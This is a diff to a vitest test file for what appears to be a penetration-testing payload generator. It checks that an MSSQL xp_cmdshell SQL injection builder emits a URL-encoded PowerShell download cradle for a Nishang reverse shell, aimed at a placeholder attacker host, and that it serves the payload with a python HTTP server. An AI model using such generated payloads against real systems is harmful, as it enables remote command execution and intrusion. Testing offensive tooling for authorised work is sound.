@@ -1,4 +1,6 @@
 import { describe, expect, it } from "vitest";
+import { buildPayload } from "../../../engines/payloads/build";
+import { REVERSE_SHELLS } from "../../../engines/payloads/reverseShells";
 import { buildSql, SQL_ENGINES, SQL_EXEC, SQL_STEPS, sqlExecIds, type SqlEngine, type SqlPoint } from "../../../engines/payloads/sql";
 
 const V = { LHOST: "192.0.2.10", LPORT: "443", columns: 3, reflected: 2, table: "users", column: "username,password", path: "/var/www/html/x.php" };
@@ -64,7 +66,8 @@ describe("buildSql", () => {
     const url = buildSql("mssql-xp_cmdshell", "mssql", "url-param", { ...V, shell: "nishang-cradle" });
     expect(url.text).toContain("DownloadString(%27%27http");
     expect(dec(url.text)).toBe(form.text);
-    expect(url.notes.join(" ")).toMatch(/Serve it first/);
+    expect(url.prepare).toBe(buildPayload(REVERSE_SHELLS.find((d) => d.id === "nishang-cradle")!, "cmd", { LHOST: V.LHOST, LPORT: V.LPORT }).prepare);
+    expect(url.prepare).toContain("python3 -m http.server 80");
   });
 
   it("nc.exe flag is %2d only in url-param", () => {
